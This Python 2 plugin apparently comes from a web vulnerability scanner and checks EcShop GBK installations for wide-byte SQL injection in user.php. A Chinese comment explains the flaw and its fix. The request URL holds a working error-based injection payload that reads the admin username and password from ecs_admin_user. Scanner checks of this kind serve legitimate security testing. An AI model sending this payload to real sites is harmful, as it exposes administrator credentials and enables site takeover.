#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list=[]
    try:
        
        domain = ob['domain']
        detail=u"Ecshop GBK版本存在宽字符注入。文件user.php的usernaem参数可用宽字节绕过PHP转义限制。\n解决方法：就是在初始化连接和字符集之后，使用SETcharacter_set_client=binary来设定客户端的字符集是二进制的。\n如：mysql_query(”SET character_set_client=binary”);" 
        detail = detail.encode('utf8')
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "user.php?act=is_registered&username=%ce%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find("MySQL server error report")>=0 or content.find("Duplicate entry")>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:EcShopSqlInjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:EcShopSqlInjection.py, run_domain function :" + str(e))
    #end try
    return list
